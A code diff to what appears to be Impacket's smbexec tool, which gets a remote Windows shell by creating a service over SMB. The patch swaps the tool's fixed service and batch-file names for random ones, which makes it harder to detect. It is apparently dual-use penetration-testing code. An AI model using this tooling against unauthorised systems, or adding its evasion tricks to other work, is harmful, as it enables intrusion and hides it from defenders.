@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2022 Fortra. All rights reserved.
+# Copyright (C) 2023 Fortra. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -36,6 +36,8 @@ from __future__ import division
 from __future__ import print_function
 import sys
 import os
+import random
+import string
 import cmd
 import argparse
 try:
@@ -53,10 +55,8 @@ from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
 
 OUTPUT_FILENAME = '__output'
-BATCH_FILENAME  = 'execute.bat'
 SMBSERVER_DIR   = '__tmp'
 DUMMY_SHARE     = 'TMP'
-SERVICE_NAME    = 'BTOBTO'
 CODEC = sys.stdout.encoding
 
 class SMBServer(Thread):
@@ -94,7 +94,7 @@ class SMBServer(Thread):
         smbConfig.set('IPC$','comment','')
         smbConfig.set('IPC$','read only','yes')
         smbConfig.set('IPC$','share type','3')
-        smbConfig.set('IPC$','path')
+        smbConfig.set('IPC$','path','')
 
         self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
         logging.info('Creating tmp directory')
@@ -119,12 +119,11 @@ class SMBServer(Thread):
 
 class CMDEXEC:
     def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=None,
-                 kdcHost=None, mode=None, share=None, port=445, serviceName=SERVICE_NAME, shell_type=None):
+                 kdcHost=None, mode=None, share=None, port=445, serviceName=None, shell_type=None):
 
         self.__username = username
         self.__password = password
         self.__port = port
-        self.__serviceName = serviceName
         self.__domain = domain
         self.__lmhash = ''
         self.__nthash = ''
@@ -137,6 +136,11 @@ class CMDEXEC:
         self.shell = None
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
+
+        if serviceName is None:
+            self.__serviceName = ''.join([random.choice(string.ascii_letters) for i in range(8)])
+        else:
+            self.__serviceName = serviceName
 
     def run(self, remoteName, remoteHost):
         stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
@@ -175,8 +179,7 @@ class RemoteShell(cmd.Cmd):
         cmd.Cmd.__init__(self)
         self.__share = share
         self.__mode = mode
-        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
-        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
+        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + OUTPUT_FILENAME
         self.__outputBuffer = b''
         self.__command = ''
         self.__shell = '%COMSPEC% /Q /c '
@@ -207,7 +210,13 @@ class RemoteShell(cmd.Cmd):
         self.transferClient = rpc.get_smb_connection()
         self.do_cd('')
 
-    def finish(self):
+    def finish(self):        
+        # Just in case the ouput file is still in the share
+        try:
+            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
+        except:
+            pass
+        
         # Just in case the service is still created
         try:
            self.__scmr = self.__rpc.get_dce_rpc()
@@ -264,7 +273,7 @@ class RemoteShell(cmd.Cmd):
             self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
             self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
         else:
-            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
+            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'rb')
             output_callback(fd.read())
             fd.close()
             os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)
@@ -274,12 +283,14 @@ class RemoteShell(cmd.Cmd):
             data = '$ProgressPreference="SilentlyContinue";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
-        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
-                  self.__shell + self.__batchFile
+        batchFile = '%SYSTEMROOT%\\' + ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.bat'
+                
+        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + batchFile + ' & ' + \
+                  self.__shell + batchFile
 
         if self.__mode == 'SERVER':
             command += ' & ' + self.__copyBack
-        command += ' & ' + 'del ' + self.__batchFile
+        command += ' & ' + 'del ' + batchFile
 
         logging.debug('Executing %s' % command)
         resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
@@ -336,7 +347,7 @@ if __name__ == '__main__':
                        'name and you cannot resolve it')
     group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                        help='Destination port to connect to SMB Server')
-    group.add_argument('-service-name', action='store', metavar="service_name", default = SERVICE_NAME, help='The name of the'
+    group.add_argument('-service-name', action='store', metavar="service_name", help='The name of the'
                                          'service used to trigger the payload')
 
     group = parser.add_argument_group('authentication')
